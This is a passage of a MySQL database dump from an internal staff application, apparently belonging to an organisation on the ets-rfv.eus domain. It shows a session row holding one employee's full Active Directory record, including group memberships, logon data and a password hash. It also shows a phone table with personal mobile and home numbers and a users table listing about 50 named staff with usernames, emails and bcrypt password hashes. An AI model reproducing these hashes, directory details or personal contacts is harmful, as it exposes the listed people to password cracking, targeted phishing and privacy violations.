12:01:58','Config|a:1:{s:4:\"time\";i:1778068940;}user_ldap|a:2:{s:5:\"count\";i:1;i:0;a:80:{s:11:\"objectclass\";a:5:{s:5:\"count\";i:4;i:0;s:3:\"top\";i:1;s:6:\"person\";i:2;s:20:\"organizationalPerson\";i:3;s:4:\"user\";}i:0;s:11:\"objectclass\";s:2:\"cn\";a:2:{s:5:\"count\";i:1;i:0;s:22:\"Xabier Ortega Gonzalez\";}i:1;s:2:\"cn\";s:2:\"sn\";a:2:{s:5:\"count\";i:1;i:0;s:15:\"Ortega Gonzalez\";}i:2;s:2:\"sn\";s:10:\"postalcode\";a:2:{s:5:\"count\";i:1;i:0;s:4:\"okta\";}i:3;s:10:\"postalcode\";s:9:\"givenname\";a:2:{s:5:\"count\";i:1;i:0;s:6:\"Xabier\";}i:4;s:9:\"givenname\";s:17:\"distinguishedname\";a:2:{s:5:\"count\";i:1;i:0;s:76:\"CN=Xabier Ortega Gonzalez,OU=UsuariosSistemasETS,OU=Sistemak,DC=ets,DC=local\";}i:5;s:17:\"distinguishedname\";s:12:\"instancetype\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"4\";}i:6;s:12:\"instancetype\";s:11:\"whencreated\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20200226131941.0Z\";}i:7;s:11:\"whencreated\";s:11:\"whenchanged\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20260506113747.0Z\";}i:8;s:11:\"whenchanged\";s:11:\"displayname\";a:2:{s:5:\"count\";i:1;i:0;s:22:\"Xabier Ortega Gonzalez\";}i:9;s:11:\"displayname\";s:10:\"usncreated\";a:2:{s:5:\"count\";i:1;i:0;s:5:\"22765\";}i:10;s:10:\"usncreated\";s:8:\"memberof\";a:34:{s:5:\"count\";i:33;i:0;s:123:\"CN=gr_Usuarios_GP_PA_Portatiles,OU=GLOBALPROTECT,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:1;s:115:\"CN=gr_datosRed_Libreria_QGIS_RUIDO_escritura,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:2;s:81:\"CN=gr_mdm_teams,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:3;s:77:\"CN=gr_okta_GP_PA_pro,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:4;s:78:\"CN=gr_okta_hyland_pro,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:5;s:80:\"CN=gr_mdm_test,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:6;s:78:\"CN=gr_okta_hyland_pre,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:7;s:73:\"CN=gr_AGS_SIV,OU=AGS_GMV,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:8;s:73:\"CN=gr_GIE2023,OU=GIE2023,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:9;s:77:\"CN=gr_okta_hodei_pre,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:10;s:77:\"CN=gr_okta_fiori_pre,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:11;s:78:\"CN=gr_okta_zimbra_pre,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:12;s:83:\"CN=gr_okta_formakuntza_pre,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:13;s:115:\"CN=gr_trena_aurkitu_pre,OU=trena_aurkitu,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:14;s:125:\"CN=gr_intranet2023_MantOpe_lectura,OU=Intranet2023,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:15;s:80:\"CN=gr_powerBI_admins,OU=PowerBI,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:16;s:75:\"CN=gr_Dorlet_MDM,OU=DORLET,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:17;s:65:\"CN=gr_portal_snow_batera_ppi_Inc_Peti,OU=Sistemak,DC=ets,DC=local\";i:18;s:84:\"CN=gr_mdm_euskoags,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:19;s:71:\"CN=gr_onbase,OU=ONBASE,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:20;s:125:\"CN=gr_txostena_reclamaciones_escritura,OU=txostena,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:21;s:100:\"CN=gr_ca_tranvia_lectura,OU=Tranvia,OU=CA,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:22;s:118:\"CN=gr_construccionObras_Lectura,OU=Construccion,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:23;s:78:\"CN=gr_basico_sap,OU=SAP,OU=sistemas,OU=Usuarios AT,OU=Usuarios,DC=ets,DC=local\";i:24;s:122:\"CN=gr_int_pertsona_lectura,OU=Pertsona_intranet,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:25;s:66:\"CN=gr_local_admin,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:26;s:68:\"CN=gr_ETS,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:27;s:42:\"CN=gr_sistemak,OU=Sistemak,DC=ets,DC=local\";i:28;s:111:\"CN=gr_implantacionHR_Lectura,OU=Sistemak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:29;s:96:\"CN=gr_datosred_Civilworks,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:30;s:56:\"CN=gr_cambiar_contraseГұa_DC,OU=Sistemak,DC=ets,DC=local\";i:31;s:81:\"CN=gr_funcional_sap,OU=SAP,OU=sistemas,OU=Usuarios AT,OU=Usuarios,DC=ets,DC=local\";i:32;s:138:\"CN=gr_intranet_kontratazioak_Sistemas,OU=Kontratazioak_intranet,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}i:11;s:8:\"memberof\";s:10:\"usnchanged\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"355058470\";}i:12;s:10:\"usnchanged\";s:4:\"name\";a:2:{s:5:\"count\";i:1;i:0;s:22:\"Xabier Ortega Gonzalez\";}i:13;s:4:\"name\";s:10:\"objectguid\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"зкәyўЧeJ”PYДcңҹх\";}i:14;s:10:\"objectguid\";s:18:\"useraccountcontrol\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"512\";}i:15;s:18:\"useraccountcontrol\";s:11:\"badpwdcount\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:16;s:11:\"badpwdcount\";s:8:\"codepage\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:17;s:8:\"codepage\";s:11:\"countrycode\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:18;s:11:\"countrycode\";s:15:\"badpasswordtime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134225418056067732\";}i:19;s:15:\"badpasswordtime\";s:9:\"lastlogon\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134225425163998403\";}i:20;s:9:\"lastlogon\";s:10:\"pwdlastset\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134206180391667801\";}i:21;s:10:\"pwdlastset\";s:14:\"primarygroupid\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"513\";}i:22;s:14:\"primarygroupid\";s:9:\"objectsid\";a:2:{s:5:\"count\";i:1;i:0;s:28:\"\0\0\0\0\0\0\0\0ХЛ\\XЎфbе;+Ү%\0\0\";}i:23;s:9:\"objectsid\";s:14:\"accountexpires\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"9223372036854775807\";}i:24;s:14:\"accountexpires\";s:10:\"logoncount\";a:2:{s:5:\"count\";i:1;i:0;s:2:\"95\";}i:25;s:10:\"logoncount\";s:14:\"samaccountname\";a:2:{s:5:\"count\";i:1;i:0;s:7:\"xaorteg\";}i:26;s:14:\"samaccountname\";s:14:\"samaccounttype\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"805306368\";}i:27;s:14:\"samaccounttype\";s:17:\"userprincipalname\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"xaorteg@ets-rfv.eus\";}i:28;s:17:\"userprincipalname\";s:11:\"lockouttime\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:29;s:11:\"lockouttime\";s:14:\"objectcategory\";a:2:{s:5:\"count\";i:1;i:0;s:52:\"CN=Person,CN=Schema,CN=Configuration,DC=ets,DC=local\";}i:30;s:14:\"objectcategory\";s:21:\"dscorepropagationdata\";a:6:{s:5:\"count\";i:5;i:0;s:17:\"20240513115928.0Z\";i:1;s:17:\"20240307123132.0Z\";i:2;s:17:\"20240307120132.0Z\";i:3;s:17:\"20240306140129.0Z\";i:4;s:17:\"16010714223649.0Z\";}i:31;s:21:\"dscorepropagationdata\";s:21:\"ms-ds-consistencyguid\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"зкәyўЧeJ”PYДcңҹх\";}i:32;s:21:\"ms-ds-consistencyguid\";s:18:\"lastlogontimestamp\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134219996917577752\";}i:33;s:18:\"lastlogontimestamp\";s:39:\"msds-lastsuccessfulinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134225406884487170\";}i:34;s:39:\"msds-lastsuccessfulinteractivelogontime\";s:35:\"msds-lastfailedinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134224758759659406\";}i:35;s:35:\"msds-lastfailedinteractivelogontime\";s:32:\"msds-failedinteractivelogoncount\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"220\";}i:36;s:32:\"msds-failedinteractivelogoncount\";s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"220\";}i:37;s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";s:4:\"mail\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"xortega@ets-rfv.eus\";}i:38;s:4:\"mail\";s:5:\"count\";i:39;s:2:\"dn\";s:76:\"CN=Xabier Ortega Gonzalez,OU=UsuariosSistemasETS,OU=Sistemak,DC=ets,DC=local\";}}Preferences|a:3:{s:6:\"IDIOMA\";s:5:\"es_ES\";s:15:\"PUESTOS_GESTION\";s:3:\"1,2\";s:4:\"skin\";s:9:\"skin-blue\";}Auth|a:1:{s:4:\"User\";O:21:\"App\\Model\\Entity\\User\":11:{s:14:\"\0*\0_accessible\";a:2:{s:1:\"*\";b:1;s:2:\"id\";b:0;}s:10:\"\0*\0_hidden\";a:1:{i:0;s:8:\"password\";}s:14:\"\0*\0_properties\";a:12:{s:2:\"id\";i:90;s:8:\"username\";s:7:\"xaorteg\";s:10:\"firts_name\";s:22:\"Xabier Ortega Gonzalez\";s:9:\"last_name\";s:0:\"\";s:8:\"password\";s:60:\"$2y$10$L/HFpCFPqU4IDSU0soSeWufMznlxrZQYyB77UHMTvliue9VUQtTT6\";s:5:\"email\";s:19:\"xortega@ets-rfv.eus\";s:7:\"role_id\";i:1;s:13:\"codigo_agente\";i:1000;s:14:\"notificaciones\";i:0;s:7:\"created\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2020-03-05 11:58:13.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:8:\"modified\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2020-09-15 09:25:47.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:2:\"dn\";s:76:\"CN-Xabier-Ortega-Gonzalez-OU-UsuariosSistemasETS-OU-Sistemak-DC-ets-DC-local\";}s:12:\"\0*\0_original\";a:0:{}s:11:\"\0*\0_virtual\";a:0:{}s:13:\"\0*\0_className\";N;s:9:\"\0*\0_dirty\";a:1:{s:2:\"dn\";b:1;}s:7:\"\0*\0_new\";b:0;s:10:\"\0*\0_errors\";a:0:{}s:11:\"\0*\0_invalid\";a:0:{}s:17:\"\0*\0_registryAlias\";s:5:\"Users\";}}',1778097740),('uhrcg4p7fhmb90637ub9ebvki6','2026-05-11 16:37:39','Config|a:1:{s:4:\"time\";i:1778517459;}',1778546259);
/*!40000 ALTER TABLE `sessions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `telefonos`
--

DROP TABLE IF EXISTS `telefonos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `telefonos` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `codigo_agente` int(11) NOT NULL,
  `tipo_telefono_id` int(11) NOT NULL,
  `telefono` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `created` datetime NOT NULL,
  `modified` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_TelefonosAgentes_Agentes` (`codigo_agente`),
  KEY `FK_TelefonosAgentes_TiposTelefono` (`tipo_telefono_id`),
  CONSTRAINT `telefonos_ibfk_2` FOREIGN KEY (`tipo_telefono_id`) REFERENCES `tipos_telefono` (`id`),
  CONSTRAINT `telefonos_ibfk_3` FOREIGN KEY (`codigo_agente`) REFERENCES `agentes` (`codigo_agente`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=22 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `telefonos`
--

LOCK TABLES `telefonos` WRITE;
/*!40000 ALTER TABLE `telefonos` DISABLE KEYS */;
INSERT INTO `telefonos` VALUES (8,245,4,'943-02-05-50','2017-12-27 09:01:41','2018-01-08 12:55:04'),(11,180,1,'+34 111-11-11-11','2017-12-27 11:34:49','2017-12-27 11:34:49'),(12,245,2,'606-86-69-80','2017-12-27 14:35:14','2018-01-08 12:55:38'),(13,155,1,'44444','2017-12-30 07:37:33','2017-12-30 07:37:33'),(14,155,1,'66666','2017-12-30 07:41:27','2017-12-30 07:41:27'),(15,375,1,'689-72-41-69','2018-01-08 12:56:32','2018-01-08 12:56:32'),(16,375,2,'647-40-14-46','2018-01-08 12:56:48','2018-01-08 12:56:48'),(17,393,2,'619238089','2018-05-03 05:03:27','2018-05-03 05:03:27'),(18,395,2,'687639499','2018-05-03 05:04:08','2018-05-03 05:04:08'),(19,394,2,'610394565','2018-05-03 05:04:41','2018-05-03 05:04:41'),(20,407,2,'+(34)(639) 50-18-82','2020-02-06 07:58:33','2020-02-06 07:58:33'),(21,407,4,'+(34)(946) 70-67-99','2020-02-06 07:59:03','2020-02-06 07:59:03');
/*!40000 ALTER TABLE `telefonos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tipos_telefono`
--

DROP TABLE IF EXISTS `tipos_telefono`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tipos_telefono` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `tipo_telefono` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tipos_telefono`
--

LOCK TABLES `tipos_telefono` WRITE;
/*!40000 ALTER TABLE `tipos_telefono` DISABLE KEYS */;
INSERT INTO `tipos_telefono` VALUES (1,'MOVIL TRABAJO'),(2,'MOVIL PARTICULAR'),(4,'FIJO CASA');
/*!40000 ALTER TABLE `tipos_telefono` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `firts_name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `last_name` varchar(100) DEFAULT NULL,
  `password` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `email` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `role_id` int(11) NOT NULL,
  `codigo_agente` int(11) DEFAULT NULL,
  `notificaciones` int(11) NOT NULL DEFAULT 1,
  `created` datetime NOT NULL,
  `modified` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `role` (`role_id`),
  KEY `codigo_agente` (`codigo_agente`),
  CONSTRAINT `users_ibfk_1` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`),
  CONSTRAINT `users_ibfk_2` FOREIGN KEY (`codigo_agente`) REFERENCES `agentes` (`codigo_agente`) ON DELETE CASCADE ON UPDATE NO ACTION
) ENGINE=InnoDB AUTO_INCREMENT=175 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (9,'juenriq','JUAN CARLOS ENRIQUE GORDILLO','ENRIQUE GORDILLO','$2y$10$57URau3B5u9NoRwcGCzfi.JOi.Rwe/zqUv9iHbea5.2YErJWT4Nai','jenrique@ets-rfv.eus',1,NULL,1,'2017-11-29 17:12:47','2020-09-17 05:13:06'),(11,'engonza','ENRIQUE GONZALEZ HERNANDO','GONZALEZ','$2y$10$1CDSYrVM8Mj5Oa2Z1n6lQua0j6G.bb.SUOASd5WSeUlaanJs8/U7S','egonzalez@ets-rfv.eus',1,NULL,1,'2018-01-17 12:40:28','2020-07-28 12:15:47'),(15,'romaiza','Roberto Maiza Recondo','','$2y$10$zbvv3dyhgT.7it1TBsFWVOQOs.HOfF8sUYN1UqxJghuPzCgWPdJTC','rmaiza@ets-rfv.eus',2,381,1,'2018-08-17 11:48:28','2018-08-17 12:08:43'),(16,'adlanso','Adoracion Lansorena','','$2y$10$SWWUsnmzqyUnxxXTWqhoLO4aQcmOR6RD6IHjXotxi8nNHDeSAwTIm','alansorena@ets-rfv.eus',2,190,1,'2018-08-17 17:44:09','2018-08-17 17:44:50'),(17,'crgarci','Cristina Garcia','','$2y$10$y342EP/0XDINDvDex7fGbeGgPevropca3uj7sWOL3HQ7X1Q8RNafa','cgarcia@ets-rfv.eus',2,198,1,'2018-08-24 05:27:05','2018-08-24 05:28:08'),(18,'enaizpu','EГұaut Aizpurua Mujika','','$2y$10$iatIy3Ocej.6acz5zkv8HOjXXrJBICh3vrG2NSloipK4yV135KgO.','eaizpurua@ets-rfv.eus',2,375,1,'2018-08-24 06:11:56','2018-08-24 06:12:35'),(20,'erroman','Erlantz Roman Ruiz de Aguirre','','$2y$10$lDnSjXsJQpoiBNzedeaYvuzDVa51ARU9xdvw6hWT.AqF/j2s0LPeu','eroman@ets-rfv.eus',1,NULL,1,'2018-09-12 09:14:42','2018-09-14 12:02:49'),(21,'testapp','testapp','','$2y$10$r.xtqjHymj81jjLwyBsNMOBuiC.9dpqE8nnrLrN/dpnqJtEwCr3xu','jcenrique170@gmail.com',2,1000,1,'2018-09-14 12:03:48','2018-11-09 12:57:23'),(22,'joberna','Jokin Bernaola de la Flor','','$2y$10$dzHnH1tzw0uiwidoDBVGH.RP/OteyaNiev23BzbbrFukkI5lhNVfa','jbernaola@ets-rfv.eus',1,NULL,0,'2018-09-17 07:09:14','2018-09-17 07:17:57'),(23,'jaibane','javier IbaГұez','','$2y$10$mwlaZ2VEgFMuPy4EaIybt.L6410kwUjzhpT2dqGWERVsvo56k6sTC','jibanez@ets-rfv.eus',1,NULL,0,'2018-09-17 07:40:35','2018-09-17 07:41:15'),(24,'raortiz','Raquel Ortiz de Pablos','','$2y$10$aog0vDfl3suFxhtGdQWX/O3N0jpS9v3sa2/rBXh87JDJN18FMhmwu','rortiz@ets-rfv.eus',1,NULL,0,'2018-09-17 07:40:59','2018-09-17 07:42:01'),(25,'darodri','David RodrГӯguez Iturriaga','','$2y$10$qUnDQisIybYWN4xOBc0/Q.P64hxDzfqKU5o8Gvfn8ssA0znQ88vf.','drodriguez@ets-rfv.eus',2,178,1,'2018-11-12 07:12:28','2019-09-11 11:29:12'),(26,'joodrio','Jose ГҒngel Odriozola Palma','','$2y$10$0S8lNBLQIHxBJ.VwjSwE7u.43OJJHF.u5keMPAuagt5uIJehw5gEO','jodriozp@ets-rfv.eus',2,193,1,'2018-12-18 10:37:28','2018-12-18 10:49:26'),(27,'mavegas','Maria Jose Vegas','','$2y$10$oOyq57HzRXaq2L5maEQi/ualC5DYPZdfl8Rxorbn.LhGh0SC/eFSu','mvegas@ets-rfv.eus',2,200,1,'2019-03-02 08:55:49','2019-03-02 08:56:08'),(28,'javigue','Javier Viguera Marzol','','$2y$10$twc6N8cdBU7f8EutUiKHMuQSNENz7Kp1pObM61TJszOSQ/tEUWdtq','fviguera@ets-rfv.eus',2,126,1,'2019-03-18 06:10:22','2019-03-18 07:29:28'),(29,'izpascu','Izaskun pascual','','$2y$10$UrthP9HycdFSc0qfUo1UFuFWmav62eLEYizyybjQNWKMtNsy1y15.','ipascual@ets-rfv.eus',2,201,1,'2019-03-26 11:04:56','2019-03-26 11:07:15'),(30,'aicanib','Aitor Canibe Villamor','','$2y$10$AIz8uMBf6rQRuoEexjBb2.0F6Pqz8L/P5htUHXupWx6C9Oj5PtWjC','acanibe@ets-rfv.eus',1,NULL,1,'2019-04-10 08:33:42','2020-10-26 10:30:32'),(31,'neoiarz','Nekane Oiarzabal','','$2y$10$wMkkVaFgXPvx9fYzw1Oj4u7ii84Yaa09AXMfZFGv14wfJ7evwuXby','noiarzabal@ets-rfv.eus',2,244,1,'2019-05-08 12:53:56','2019-05-09 09:55:52'),(32,'esrodri','Estibaliz Rodrigalvarez Urrutikoetxea','','$2y$10$HpCyhpORBfSIiTeyzBCesuY9AIA.jytNMT4b6PoLeukCOtJfySUBC','ERODRIGALVAREZ@ETS-RFV.EUS',2,292,1,'2019-05-08 12:58:52','2019-05-09 09:55:33'),(33,'mairast','Maria Jesus Irastorza Egurbide','','$2y$10$DmvP/VrnmV5Dqxkul3JU4OmABi7GztTM58Vdl/Uj/RidfV9Xd2/dy','mirastorza@ets-rfv.eus',2,291,1,'2019-05-08 12:58:58','2019-05-09 09:55:14'),(34,'idbasti','Idoia Bastida Lastra','','$2y$10$3WCZgdZ82ipRDjTg2rrCx.WarYzRfLzzBQzFCSFpRZPRYudiFN.Ni','mbastida@ets-rfv.eus',2,207,1,'2019-05-09 12:13:44','2019-05-09 12:14:16'),(35,'mealvar','Mercedes ГҒlvarez Cid','','$2y$10$8aewoRmQKxUDAjqV/rb87e/8/xHtWvKDQdUe/PlVeDal4sJXCqPY6','malvarez@ets-rfv.eus',2,180,1,'2019-05-10 21:17:01','2019-05-11 05:33:28'),(36,'crurang','Cristina Uranga LГіpez','','$2y$10$ecCgaalzcd0aFxlfEOUFqu61A/fSyRnnAnu0m1pwQqJ9t9jKleCXy','muranga@ets-rfv.eus',2,197,1,'2019-05-10 22:19:04','2019-05-11 05:33:02'),(37,'suvigar','Susana Vigara MartГӯn','','$2y$10$3TxIdCM8WKFB60EseksrpOM1Huf/3gN7wGDkLhB2JA61OUa2Cw8GC','mvigara@ets-rfv.eus',2,196,1,'2019-05-14 20:36:19','2019-05-15 05:01:30'),(38,'esaguad','Estela Aguado','','$2y$10$q3KMibeIpPBA68ZF9DNtveVshYPVWnlFMksI9XHZ/G5AnjT10Q/BS','eaguado@ets-rfv.eus',2,245,1,'2019-05-15 12:32:17','2021-02-15 13:23:38'),(39,'capeina','Carlos Peinador','','$2y$10$F0JDAtYCQdH0bFS2UXaiNO3HQtlAu6X4utbGOkR0fcT3t5Kk89.gC','cpeinador@ets-rfv.eus',2,239,1,'2019-05-16 05:57:50','2019-05-16 06:00:07'),(40,'andiazl','Antonio DГӯaz Lucio','','$2y$10$UVdKgNDdwcjJIzoqeaKAdOon135KZl6d4/n4UqztxYvamfBh2fzzW','adiaz@ets-rfv.eus',2,159,1,'2019-06-19 12:31:09','2019-06-20 04:57:04'),(41,'maartig','Maria Angeles Artigas','','$2y$10$aYNiNmYEH50NwUyG9hyxUefW4Fa.Vr0Q5s4k.OAMfDA00P.l8xsCi','martigas@ets-rfv.eus',2,241,1,'2019-06-20 04:44:08','2019-06-20 04:56:12'),(42,'mirubio','Miguel Rubio','','$2y$10$VHIgL3olfr6bWpY8sh4xjebiqvFNCfGuCFbrGoP.vcRpWR4MHWQ.e','mrubio@ets-rfv.eus',2,81,1,'2019-07-05 19:54:21','2019-07-08 04:55:52'),(43,'algerri','Ales Gerrikabeitia','','$2y$10$NAj5XlCQZHQMOOWSloslEOgwCJadBao.Rrh7w5qXVGOvjnNNu1s0a','agerrikabeitia@ets-rfv.eus',2,63,1,'2019-09-12 12:13:07','2019-09-12 14:47:59'),(44,'grsaras','Gregorio Sarasola Gonzalez','','$2y$10$eUV2r17wDMdRiMu.DfHij.CdHyyEDGGHqS3EuO7OSQkGTLM8u5s.S','gsarasola@ets-rfv.eus',1,NULL,1,'2019-09-12 14:08:34','2019-09-12 14:49:20'),(45,'jomarco','Jorge Marcos Blanco','','$2y$10$XMl6jZTbmM1htVC1sgMC6uRsmJpjobmvqe9BG1ig3QkcIp2mJt4YK','JMARCOS@ETS-RFV.EUS',2,370,1,'2019-09-13 04:53:26','2019-09-13 07:30:19'),(47,'amuriar','Amaia Uriarte Castresana','','$2y$10$LrJhT/d6c/W/rWSmBXwkb.Q7LPylc/qU5gkBnLzsW/io1CzQCkkjm','auriarte@ets-rfv.eus',2,385,1,'2019-09-16 07:48:07','2019-09-16 07:50:13'),(48,'naagirr','Nagore Agirre Aurrekoetxea','','$2y$10$VSIPh9okNIwAiPOqJxlk5OPRz/VNC/0DiscmNnAaNO6dLLqyrQEti','nagirre@ets-rfv.eus',2,378,1,'2019-09-16 08:02:59','2019-09-16 09:30:08'),(49,'Ramench','Raul Menchero Merino','','$2y$10$WdZigoLEnazJFaTYATg9T.yBcjh3RQgUsCaecBbvSjKEqMaxkzfT6','rmenchero@ets-rfv.eus',2,405,1,'2019-09-16 08:23:58','2019-09-16 09:34:48'),(50,'alarasb','Alberto Aras Bocanegra','','$2y$10$BtW87EIQFXELOSa7oy7xUOCc9vHf8EjxUtixXVXRvmNk0Weu3xVtq','aaras@ets-rfv.eus',2,NULL,1,'2019-09-16 09:19:52','2019-09-16 09:19:52'),(52,'aillona','Aitor Llona Barrenetxea','','$2y$10$CkjZ.yW57tLP/8452vjdHuLvKDADZ0QWQwnP9WHN1/4P4qVaKfCyW','allona@ets-rfv.eus',3,293,1,'2019-09-16 10:30:16','2021-01-20 13:09:50'),(53,'pejuanb','Pedro Daniel Juan Benito','','$2y$10$6F.K4dQgzdENR6NkH00//.wxTLiCENK0s8JYOV2NBGoA5TdgUH/s2','pjuan@ets-rfv.eus',2,NULL,1,'2019-09-16 10:44:03','2019-09-16 10:44:03'),(54,'asvelez','Asier Velez Garcia','','$2y$10$puHyqOq.nKMg2pzaNBJfsOluuLObGQqKhw96Rqm3J.NOxB0tJ.sfO','avelez@ets-rfv.eus',2,367,1,'2019-09-16 12:02:32','2019-09-16 12:03:19'),(55,'megonza','Mertxe GonzГЎlez PeГұas','','$2y$10$HTz.y9lR.CGQcuY3pqPDh.HBzcyq6BBpTigXI1QW220ERk7t.lvcK','mgonzalez@ets-rfv.eus',2,167,1,'2019-09-16 12:04:47','2019-09-16 12:05:14'),(56,'jesanzf','Jesus MВӘ Sanz FernГЎndez','','$2y$10$m7fFaPWnsDe0jggs8.YmZ.4uxmf/JCsidGKMXI.Hd9V0Mw0tKh5du','jsanzf@ets-rfv.eus',2,234,1,'2019-09-16 12:14:01','2019-09-16 12:14:25'),(57,'jobernt','JosГ© Luis Bernardino Troyano','','$2y$10$AAqfGc2qo9bxRdth6NkPrO6FunpsK9AEDQaUi8PVYXS2JVVJjMcre','jbernardino@ets-rfv.eus',2,380,1,'2019-09-16 12:29:03','2019-09-16 12:55:49'),(58,'pipared','Pilar Paredes MatГӯas','','$2y$10$Xw5xRb7WER7sYU4dTclaQeUGzMQ7IwhrFVqVW1LIa1W0roFBvql/m','pparedes@ets-rfv.eus',2,202,1,'2019-09-16 12:52:50','2019-09-16 12:55:22'),(59,'daayest','David Ayesta Rementeria','','$2y$10$/XPO6AvTqMJyZf6L7KgCIO5TNVhq8uv1oMVkr8WFhnY/nOgIuy0ly','dayesta@ets-rfv.eus',2,366,1,'2019-09-17 03:46:16','2019-09-17 03:54:18'),(60,'auperez','Aurora 